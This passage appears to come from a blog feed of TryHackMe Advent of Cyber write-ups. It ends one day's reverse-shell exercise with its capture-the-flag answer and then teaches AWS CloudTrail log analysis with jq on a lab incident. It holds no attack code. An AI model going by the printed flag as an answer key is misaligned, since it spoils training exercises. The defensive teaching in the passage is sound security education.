<p>Answer the questions below</p>

<p>What is the flag value once Glitch gets reverse shell on the digital vault using port 4444? Note: The flag may take around a minute to appear in the <strong>C:\Users\glitch\Desktop</strong> directory. You can view the content of the flag by using the command <strong>type C:\Users\glitch\Desktop\flag.txt</strong>.</p>

<p>AOC{GOT_MY_ACCESS_B@CK007}</p>

<p>Are you interested in learning more about evasion? Take a look at the <a href="https://tryhackme.com/r/room/avevasionshellcode">AV Evasion: Shellcode</a> room.</p>]]></content><author><name>Michael</name></author><category term="documentation" /><category term="AoC" /><summary type="html"><![CDATA[The Story]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/Day8Header.png" /><media:content medium="image" url="http://localhost:4000/Day8Header.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Try Hackme Advent of Cyber - Day 7</title><link href="http://localhost:4000/Day7" rel="alternate" type="text/html" title="Try Hackme Advent of Cyber - Day 7" /><published>2024-12-07T00:00:00-05:00</published><updated>2024-12-07T00:00:00-05:00</updated><id>http://localhost:4000/Day7</id><content type="html" xml:base="http://localhost:4000/Day7"><![CDATA[<p>The Story</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/5dbea226085ab6182a2ee0f7-1730384938554.png" alt="Task banner for day 7." /></p>

<p><em>As SOC-mas approached, so did the need,</em></p>

<p><em>To provide those without, with something to read.</em></p>

<p><em>Care4Wares tried, they made it their mission,</em></p>

<p><em>A gift for all wares, a SOC-mas tradition.</em></p>

<p><em>Although they had some, they still needed more,</em></p>

<p><em>To pick up some books, they’d head to the store.</em></p>

<p><em>The town’s favourite books, would no doubt make them jolly,</em></p>

<p><em>They ticked off the list, as they filled up the trolley.</em></p>

<p><em>With the last book ticked off, the shopping was done,</em></p>

<p><em>When asked for their card, the ware handed them one.</em></p>

<p><em>“I’m sorry” he said, as the shop clerk reclined,</em></p>

<p><em>“I can’t sell you these books, as your card has declined.”</em></p>

<p><em>The ware put them back, as they walked in confusion,</em></p>

<p><em>How could this be? An attack? An intrusion?</em></p>

<p><em>And when they logged on, the ware got a scare,</em></p>

<p><em>To find the donations, they just weren’t there!</em></p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6228f0d4ca8e57005149c3e3/room-content/6228f0d4ca8e57005149c3e3-1731078051718.png" alt="ware buying books image" /> \n</p>

<h2 id="monitoring-in-an-aws-environment">Monitoring in an AWS Environment</h2>

<p>Care4Wares’ infrastructure runs in the cloud, so they chose AWS as their Cloud Service Provider (CSP). Instead of their workloads running on physical machines on-premises, they run on virtualised instances in the cloud. These instances are (in AWS) called EC2 instances (Amazon Elastic Compute Cloud). A few members of the Wareville SOC aren’t used to log analysis on the cloud, and with a change of environment comes a change of tools and services needed to perform their duties. Their duties this time are to help Care4Wares figure out what has happened to the charity’s funds; to do so, they will need to learn about an AWS service called CloudWatch.</p>

<p><strong>CloudWatch</strong></p>

<p>AWS CloudWatch is a monitoring and observability platform that gives us greater insight into our AWS environment by monitoring applications at multiple levels. CloudWatch provides functionalities such as the monitoring of system and application metrics and the configuration of alarms on those metrics for the purposes of today’s investigation, though we want to focus specifically on CloudWatch logs. Running an application in a cloud environment can mean leveraging lots of different services (e.g. a service running the application, a service running functions triggered by that application, a service running the application backend, etc.); this translates to logs being generated from lots of different sources. CloudWatch logs make it easy for users to access, monitor and store the logs from all these various sources. A CloudWatch agent must be installed on the appropriate instance for application and system metrics to be captured.</p>

<p>A key feature of CloudWatch logs that will help the Warevile SOC squad and us make sense of what happened in their environment is the ability to query application logs using filter patterns. Here are some CloudWatch terms you should know before going further:</p>

<ul>
  <li><strong>Log Events:</strong> A log event is a single log entry recording an application “event”; these will be timestamped and packaged with log messages and metadata.</li>
  <li><strong>Log Streams:</strong> Log streams are a collection of log events from a single source.</li>
  <li><strong>Log Groups:</strong> Log groups are a collection of log streams. Log streams are collected into a log group when logically it makes sense, for example, if the same service is running across multiple hosts.</li>
</ul>

<p><strong>CloudTrail</strong></p>

<p>CloudWatch can track infrastructure and application performance, but what if you wanted to monitor actions in your AWS environment? These would be tracked using another service called AWS CloudTrail. Actions can be those taken by a user, a role (granted to a user giving them certain permissions) or an AWS service and are recorded as events in AWS CloudTrail. Essentially, any action the user takes (via the management console or AWS CLI) or service will be captured and stored. Some features of CloudTrail include:</p>

<ul>
  <li><strong>Always On:</strong> CloudTrail is enabled by default for all users</li>
  <li><strong>JSON-formatted:</strong> All event types captured by CloudTrail will be in the CloudTrail JSON format</li>
  <li><strong>Event History:</strong> When users access CloudTrail, they will see an option “Event History”, event history is a record of the actions that have taken place in the last 90 days. These records are queryable and can be filtered on attributes such as “resource” type.</li>
  <li><strong>Trails:</strong> The above-mentioned event history can be thought of as the default “trail,” included out of the box. However, users can define custom trails to capture specific actions, which is useful if you have bespoke monitoring scenarios you want to capture and store <strong>beyond the 90-day event history retention period</strong>.</li>
  <li><strong>Deliverable:</strong>  As mentioned, CloudWatch can be used as a single access point for logs generated from various sources; CloudTrail is no different and has an optional feature enabling <strong>CloudTrail logs to be delivered to CloudWatch</strong>.</li>
</ul>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6228f0d4ca8e57005149c3e3/room-content/6228f0d4ca8e57005149c3e3-1731078142249.png" alt="JSON rain image" /> \n</p>

<p>As mentioned, Cloudtrail helps capture and record actions taken. These actions could be interactions with any number of AWS services. For example, services like <strong>S3</strong> (Amazon Simple Storage Service used for object storage) and <strong>IAM</strong> (AWS’s Identity and Access Management service can be used to secure access to your AWS environment with the creation of identities and the assigning of access permissions to those identities) will have actions taken within their service recorded. These recorded events can be very helpful when performing an investigation. \n</p>

<h2 id="intro-to-jq">Intro to JQ</h2>

<p><strong>What is JQ?</strong></p>

<p>Earlier, it was mentioned that Cloudtrail logs were JSON-formatted. When ingested in large volumes, this machine-readable format can be tricky to extract meaning from, especially in the context of log analysis. The need then arises for something to help us transform and filter that JSON data into meaningful data we can understand and use to gain security insights. That’s exactly what JQ is (and does!). Similar to command line tools like sed, awk and grep, JQ is a lightweight and flexible command line processor that can be used on JSON.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6228f0d4ca8e57005149c3e3/room-content/6228f0d4ca8e57005149c3e3-1731078090249.png" alt="Cloud JQ investigation image" /> \n</p>

<p><strong>How Can It Be Used?</strong></p>

<p>Now, let’s take a look at how we use JQ to transform and filter JSON data. The wares being the wares, they stored their shopping list from the trip to the bookstore in JSON format. Let’s take a look at that:</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span>

<span class="p">{</span> <span class="dl">"</span><span class="s2">book_title</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Wares Wally</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">genre</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">children</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">page_count</span><span class="dl">"</span><span class="p">:</span> <span class="mi">20</span> <span class="p">},</span>

<span class="p">{</span> <span class="dl">"</span><span class="s2">book_title</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Charlottes Web Crawler</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">genre</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">young_ware</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">page_count</span><span class="dl">"</span><span class="p">:</span> <span class="mi">120</span> <span class="p">},</span>

<span class="p">{</span> <span class="dl">"</span><span class="s2">book_title</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Charlie and the 8 Bit Factory</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">genre</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">young_ware</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">page_count</span><span class="dl">"</span><span class="p">:</span> <span class="mi">108</span> <span class="p">},</span>

<span class="p">{</span> <span class="dl">"</span><span class="s2">book_title</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">The Princess and the Pcap</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">genre</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">children</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">page_count</span><span class="dl">"</span><span class="p">:</span> <span class="mi">48</span> <span class="p">},</span>

<span class="p">{</span> <span class="dl">"</span><span class="s2">book_title</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">The Lion, the Glitch and the Wardrobe</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">genre</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">young_ware</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">page_count</span><span class="dl">"</span><span class="p">:</span> <span class="mi">218</span> <span class="p">}</span>

<span class="p">]</span>
</code></pre></div></div>

<p>JQ takes two inputs: the filter you want to use, followed by the input file. We start our JQ filter with a <code class="language-plaintext highlighter-rouge">.</code> which just tells JQ we are accessing the current input. From here, we want to access the array of values stored in our JSON (with the <code class="language-plaintext highlighter-rouge">[]</code>). Making our filter a <code class="language-plaintext highlighter-rouge">.[]</code>. For example, let’s run the following command.</p>

<p>JQ syntax</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">user</span><span class="p">@</span><span class="nd">tryhackme</span><span class="nx">$</span> <span class="nx">jq</span> <span class="dl">'</span><span class="s1">.[]</span><span class="dl">'</span> <span class="nx">book_list</span><span class="p">.</span><span class="nx">json</span>
</code></pre></div></div>

<p>The command above would result in this output:</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span>
  <span class="dl">"</span><span class="s2">book_title</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Wares Wally</span><span class="dl">"</span><span class="p">,</span>
  <span class="dl">"</span><span class="s2">genre</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">children</span><span class="dl">"</span><span class="p">,</span>
  <span class="dl">"</span><span class="s2">page_count</span><span class="dl">"</span><span class="p">:</span> <span class="mi">20</span>
<span class="p">}</span>
<span class="p">{</span>
  <span class="dl">"</span><span class="s2">book_title</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Charlottes Web Crawler</span><span class="dl">"</span><span class="p">,</span>
  <span class="dl">"</span><span class="s2">genre</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">young_ware</span><span class="dl">"</span><span class="p">,</span>
  <span class="dl">"</span><span class="s2">page_count</span><span class="dl">"</span><span class="p">:</span> <span class="mi">120</span>
<span class="p">}</span>
<span class="p">{</span>
  <span class="dl">"</span><span class="s2">book_title</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Charlie and the 8 Bit Factory</span><span class="dl">"</span><span class="p">,</span>
  <span class="dl">"</span><span class="s2">genre</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">young_ware</span><span class="dl">"</span><span class="p">,</span>
  <span class="dl">"</span><span class="s2">page_count</span><span class="dl">"</span><span class="p">:</span> <span class="mi">108</span>
<span class="p">}</span>
<span class="p">{</span>
  <span class="dl">"</span><span class="s2">book_title</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">The Princess and the Pcap</span><span class="dl">"</span><span class="p">,</span>
  <span class="dl">"</span><span class="s2">genre</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">children</span><span class="dl">"</span><span class="p">,</span>
  <span class="dl">"</span><span class="s2">page_count</span><span class="dl">"</span><span class="p">:</span> <span class="mi">48</span>
<span class="p">}</span>
<span class="p">{</span>
  <span class="dl">"</span><span class="s2">book_title</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">The Lion, the Glitch and the Wardrobe</span><span class="dl">"</span><span class="p">,</span>
  <span class="dl">"</span><span class="s2">genre</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">young_ware</span><span class="dl">"</span><span class="p">,</span>
  <span class="dl">"</span><span class="s2">page_count</span><span class="dl">"</span><span class="p">:</span> <span class="mi">218</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Once we’ve accessed the array, we can grab elements from that array by going one step deeper. For example, we could run this JQ command:</p>

<p>JQ syntax</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">user</span><span class="p">@</span><span class="nd">tryhackme</span><span class="nx">$</span> <span class="nx">jq</span>  <span class="dl">'</span><span class="s1">.[] | .book_title</span><span class="dl">'</span> <span class="nx">book_list</span><span class="p">.</span><span class="nx">json</span>
</code></pre></div></div>

<p>If we wanted to view all the book titles contained within this JSON file, this would return a nicely formatted output like this:</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="dl">"</span><span class="s2">Wares Wally</span><span class="dl">"</span>
<span class="dl">"</span><span class="s2">Charlottes Web Crawler</span><span class="dl">"</span>
<span class="dl">"</span><span class="s2">Charlie and the 8 Bit Factory</span><span class="dl">"</span>
<span class="dl">"</span><span class="s2">The Princess and the Pcap</span><span class="dl">"</span>
<span class="dl">"</span><span class="s2">The Lion, the Glitch and the Wardrobe</span><span class="dl">"</span>
</code></pre></div></div>

<p>That’s a lot nicer to look at, isn’t it? It gives you an idea of what JQ is and what it does. Of course, JQ can filter and transform JSON data in many additional ways. In our upcoming investigation, we’ll see the tool in action.</p>

<h2 id="the-peculiar-case-of-care4wares-dry-funds">The Peculiar Case of Care4Wares’ Dry Funds</h2>

<p>Now that we have refreshed our knowledge of AWS Cloudtrail and JQ alongside McSkidy, let’s investigate this peculiar case of Care4Wares’ dry funds.</p>

<p>The responsible ware for the Care4Wares charity drive gave us the following info regarding this incident:</p>

<p><em>We sent out a link on the 28th of November to everyone in our network that points to a flyer with the details of our charity. The details include the account number to receive donations. We received many donations the first day after sending out the link, but there were none from the second day on. I talked to multiple people who claimed to have donated a respectable sum. One showed his transaction, and I noticed the account number was wrong. I checked the link, and it was still the same. I opened the link, and the digital flyer was the same except for the account number.</em></p>

<p>McSkidy recalls putting the digital flyer, <strong>wareville-bank-account-qr.png</strong>, in an Amazon AWS S3 bucket named <strong>wareville-care4wares</strong>. Let’s assist McSkidy and start by finding out more about that link. Before that, let’s first review the information that we currently have to start the investigation:</p>

<ul>
  <li>The day after the link was sent out, several donations were received.</li>
  <li>Since the second day after sending the link, no more donations have been received.</li>
  <li>A donator has shown proof of his transaction. It was made 3 days after he received the link. The account number in the transaction was not correct.</li>
  <li>McSkidy put the digital flyer in the AWS S3 object named <strong>wareville-bank-account-qr.png</strong> under the bucket <strong>wareville-care4wares</strong>.</li>
  <li>The link has not been altered.</li>
</ul>

<h2 id="connection-details">Connection Details</h2>

<p>Now that we have enough information, let’s start the attached Virtual Machine in this task by clicking the Start Machine button below. Note that the machine may take 3-5 minutes to initialise.</p>

<p>The machine will start in a split-screen view. If the VM is not visible, use the blue Show Split View button at the top right of the page.</p>

<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5dbea226085ab6182a2ee0f7/room-content/5dbea226085ab6182a2ee0f7-1730138006613.png" alt="Connection card for Day 7 - VM in split-screen." /> \n</p>

<h2 id="glitch-did-it">Glitch Did It</h2>

<p>Let’s examine the Cloudtrail logs related to the <strong>wareville-care4wares</strong> S3 bucket. For a quick example, a typical S3 log entry looks like this:</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">{</span>
  <span class="dl">"</span><span class="s2">eventVersion</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">1.10</span><span class="dl">"</span><span class="p">,</span>
  <span class="dl">"</span><span class="s2">userIdentity</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span>
    <span class="dl">"</span><span class="s2">type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">IAMUser</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">principalId</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">AIDAXRMKYT5O5Y2GLD4ZG</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">arn</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">arn:aws:iam::518371450717:user/wareville_collector</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">accountId</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">518371450717</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">accessKeyId</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">AKIAXRMKYT5OZCZPGNZ7</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">userName</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">wareville_collector</span><span class="dl">"</span>
  <span class="p">},</span>
  <span class="dl">"</span><span class="s2">eventTime</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">2024-10-21T22:13:24Z</span><span class="dl">"</span><span class="p">,</span>
  <span class="dl">"</span><span class="s2">eventSource</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">s3.amazonaws.com</span><span class="dl">"</span><span class="p">,</span>
  <span class="dl">"</span><span class="s2">eventName</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">ListObjects</span><span class="dl">"</span><span class="p">,</span>
  <span class="dl">"</span><span class="s2">awsRegion</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">ap-southeast-1</span><span class="dl">"</span><span class="p">,</span>
  <span class="dl">"</span><span class="s2">sourceIPAddress</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">34.247.218.56</span><span class="dl">"</span><span class="p">,</span>
  <span class="dl">"</span><span class="s2">userAgent</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">[aws-sdk-go/0.24.0 (go1.22.6; linux; amd64)]</span><span class="dl">"</span><span class="p">,</span>
  <span class="dl">"</span><span class="s2">requestParameters</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span>
    <span class="dl">"</span><span class="s2">bucketName</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">aoc-cloudtrail-wareville</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">Host</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">aoc-cloudtrail-wareville.s3.ap-southeast-1.amazonaws.com</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">prefix</span><span class="dl">"</span><span class="p">:</span> <span class="dl">""</span>
  <span class="p">},</span>
  <span class="dl">"</span><span class="s2">responseElements</span><span class="dl">"</span><span class="p">:</span> <span class="kc">null</span><span class="p">,</span>
  <span class="dl">"</span><span class="s2">additionalEventData</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span>
    <span class="dl">"</span><span class="s2">SignatureVersion</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">SigV4</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">CipherSuite</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">TLS_AES_128_GCM_SHA256</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">bytesTransferredIn</span><span class="dl">"</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">AuthenticationMethod</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">AuthHeader</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">x-amz-id-2</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">yqniVtqBrL0jNyGlvnYeR3BvJJPlXdgxvjAwwWhTt9dLMbhgZugkhlH8H21Oo5kNLiq8vg5vLoj3BNl9LPEAqN5iHpKpZ1hVynQi7qrIDk0=</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">bytesTransferredOut</span><span class="dl">"</span><span class="p">:</span> <span class="mi">236375</span>
  <span class="p">},</span>
  <span class="dl">"</span><span class="s2">requestID</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">YKEKJP7QX32B4NZB</span><span class="dl">"</span><span class="p">,</span>
  <span class="dl">"</span><span class="s2">eventID</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">fd80529f-d0af-4f44-8034-743d8d92bdcf</span><span class="dl">"</span><span class="p">,</span>
  <span class="dl">"</span><span class="s2">readOnly</span><span class="dl">"</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span>
  <span class="dl">"</span><span class="s2">resources</span><span class="dl">"</span><span class="p">:</span> <span class="p">[</span>
    <span class="p">{</span>
      <span class="dl">"</span><span class="s2">type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">AWS::S3::Object</span><span class="dl">"</span><span class="p">,</span>
      <span class="dl">"</span><span class="s2">ARNPrefix</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">arn:aws:s3:::aoc-cloudtrail-wareville/</span><span class="dl">"</span>
    <span class="p">},</span>
    <span class="p">{</span>
      <span class="dl">"</span><span class="s2">accountId</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">518371450717</span><span class="dl">"</span><span class="p">,</span>
      <span class="dl">"</span><span class="s2">type</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">AWS::S3::Bucket</span><span class="dl">"</span><span class="p">,</span>
      <span class="dl">"</span><span class="s2">ARN</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">arn:aws:s3:::aoc-cloudtrail-wareville</span><span class="dl">"</span>
    <span class="p">}</span>
  <span class="p">],</span>
  <span class="dl">"</span><span class="s2">eventType</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">AwsApiCall</span><span class="dl">"</span><span class="p">,</span>
  <span class="dl">"</span><span class="s2">managementEvent</span><span class="dl">"</span><span class="p">:</span> <span class="kc">false</span><span class="p">,</span>
  <span class="dl">"</span><span class="s2">recipientAccountId</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">518371450717</span><span class="dl">"</span><span class="p">,</span>
  <span class="dl">"</span><span class="s2">eventCategory</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">Data</span><span class="dl">"</span><span class="p">,</span>
  <span class="dl">"</span><span class="s2">tlsDetails</span><span class="dl">"</span><span class="p">:</span> <span class="p">{</span>
    <span class="dl">"</span><span class="s2">tlsVersion</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">TLSv1.3</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">cipherSuite</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">TLS_AES_128_GCM_SHA256</span><span class="dl">"</span><span class="p">,</span>
    <span class="dl">"</span><span class="s2">clientProvidedHostHeader</span><span class="dl">"</span><span class="p">:</span> <span class="dl">"</span><span class="s2">aoc-cloudtrail-wareville.s3.ap-southeast-1.amazonaws.com</span><span class="dl">"</span>
  <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div>

<p>It might be overwhelming to see the sheer amount of information in one event, but there are some elements that we can focus on for our investigation:</p>

<table>
  <thead>
    <tr>
      <th><strong>Field</strong></th>
      <th><strong>Description</strong></th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>userIdentity</td>
      <td>Details of the user account that acted on an object.</td>
    </tr>
    <tr>
      <td>eventTime</td>
      <td>When did the action occur?</td>
    </tr>
    <tr>
      <td>eventType</td>
      <td>What type of event occurred? (e.g., AwsApiCall or AwsConsoleSignIn, AwsServiceEvent)</td>
    </tr>
    <tr>
      <td>eventSource</td>
      <td>From what service was the event logged?</td>
    </tr>
    <tr>
      <td>eventName</td>
      <td>What specific action occurred? (e.g., ListObjects, GetBucketObject)</td>
    </tr>
    <tr>
      <td>sourceIPAddress</td>
      <td>From what IP did the action happen?</td>
    </tr>
    <tr>
      <td>userAgent</td>
      <td>What user agent was used to perform the action? (e.g., Firefox, AWS CLI)</td>
    </tr>
    <tr>
      <td>requestParameters</td>
      <td>What parameters were involved in the action? (e.g., BucketName)</td>
    </tr>
  </tbody>
</table>

<p>By using the guide above, we can read the example log entry as follows:</p>

<ul>
  <li>The IAM user, <strong>wareville_collector</strong>, listed all objects (ListObjects event) of the S3 bucket named <strong>aoc-cloudtrail-wareville</strong>.</li>
  <li>The IP address from which this request originated is <strong>34.247.218.56</strong>.</li>
  <li>The user agent indicates that the request was made using the <strong>AWS SDK tool for Go</strong>.</li>
</ul>

<p>Now that we know where to look, let’s use JQ to filter the log for events related to the <strong>wareville-bank-account-qr.png</strong> S3 object. The goal is to use the same elements to filter the log file using JQ and format the results into a table to make it more readable. According to McSkidy, the logs are stored in the <code class="language-plaintext highlighter-rouge">~/wareville_logs</code> directory.</p>

<p>To start, click the <strong>Terminal</strong> icon on the Desktop and enter the two commands below:</p>

<p>ubuntu@tryhackme:~/</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">ubuntu</span><span class="p">@</span><span class="nd">tryhackme</span><span class="p">:</span><span class="o">~</span><span class="sr">/$ cd wareville_log</span><span class="err">s
</span><span class="nx">ubuntu</span><span class="p">@</span><span class="nd">tryhackme</span><span class="p">:</span><span class="o">~</span><span class="sr">/$ l</span><span class="err">s
</span><span class="nx">cloudtrail_log</span><span class="p">.</span><span class="nx">json</span>  <span class="nx">rds</span><span class="p">.</span><span class="nx">log</span>
</code></pre></div></div>

<p>With the commands above, we initially changed our current directory to the directory McSkidy mentioned via the <code class="language-plaintext highlighter-rouge">cd</code> command, and we listed the directory’s contents using the <code class="language-plaintext highlighter-rouge">ls</code> command. As you can see, two files are inside it, but we will focus first on the <strong>cloudtrail_log.json</strong> for this investigation.</p>

<p>Now, let’s start investigating the CloudTrail logs by executing the command below.</p>

<p>ubuntu@tryhackme:~/wareville_logs</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">ubuntu</span><span class="p">@</span><span class="nd">tryhackme</span><span class="p">:</span><span class="o">~</span><span class="sr">/wareville_logs$ jq -r '.Records</span><span class="se">[]</span><span class="sr"> | select</span><span class="se">(</span><span class="sr">.eventSource == "s3.amazonaws.com" and .requestParameters.bucketName=="wareville-care4wares"</span><span class="se">)</span><span class="sr">' cloudtrail_log.jso</span><span class="err">n
</span></code></pre></div></div>

<p>Let’s do a quick breakdown of the command we executed:</p>

<table>
  <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">jq -r 'FILTER' cloudtrail_log.json</code></td>
      <td>The <strong>-r</strong> flag tells <strong>jq</strong> to output the results in RAW format instead of JSON. Note that the <strong>FILTER</strong> section is enclosed with single quotes.The last part of the command accepts the input file, which is <strong>cloudtrail_log.json</strong>.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">.Records[]</code></td>
      <td>Instructs <strong>jq</strong> to parse the events in the Records container element. The <strong>Records</strong> field is the top element in the JSON-formatted CloudTrail log.</td>
    </tr>
    <tr>
      <td><code class="language-plaintext highlighter-rouge">| select(.eventSource == "s3.amazonaws.com" and .requestParameters.bucketName=="wareville-care4wares")</code></td>
      <td>Uses the previous command’s output, and filters it on the <strong>eventSource</strong> and <strong>requestParameters.bucketName</strong> keys.The value <strong>s3.amazonaws.com</strong> is used to filter events related to the Amazon AWS S3 service, and the value  <strong>wareville-care4wares</strong> is used to filter events related to the target S3 bucket.</td>
    </tr>
  </tbody>
</table>

<p>As you can see in the command output, we were able to trim down the results since all of the entries are from S3. However, it is still a bit overwhelming since all the fields are included in the output. Now, let’s refine the output by selecting the significant fields. Execute the following command below:</p>

<p>ubuntu@tryhackme:~/wareville_logs</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">ubuntu</span><span class="p">@</span><span class="nd">tryhackme</span><span class="p">:</span><span class="o">~</span><span class="sr">/wareville_logs$ jq -r '.Records</span><span class="se">[]</span><span class="sr"> | select</span><span class="se">(</span><span class="sr">.eventSource == "s3.amazonaws.com" and .requestParameters.bucketName=="wareville-care4wares"</span><span class="se">)</span><span class="sr"> | </span><span class="se">[</span><span class="sr">.eventTime, .eventName, .userIdentity.userName </span><span class="se">//</span><span class="sr"> "N</span><span class="se">/</span><span class="sr">A",.requestParameters.bucketName </span><span class="se">//</span><span class="sr"> "N</span><span class="se">/</span><span class="sr">A", .requestParameters.key </span><span class="se">//</span><span class="sr"> "N</span><span class="se">/</span><span class="sr">A", .sourceIPAddress </span><span class="se">//</span><span class="sr"> "N</span><span class="se">/</span><span class="sr">A"</span><span class="se">]</span><span class="sr">' cloudtrail_log.jso</span><span class="err">n
</span></code></pre></div></div>

<p>As you can see, we have appended another pipe (<code class="language-plaintext highlighter-rouge">|</code>) after our previous filter. Let’s discuss it quickly:</p>

<table>
  <thead>
    <tr>
      <th>Command</th>
      <th>Description</th>
    </tr>
  </thead>
  <tbody>
    <tr>
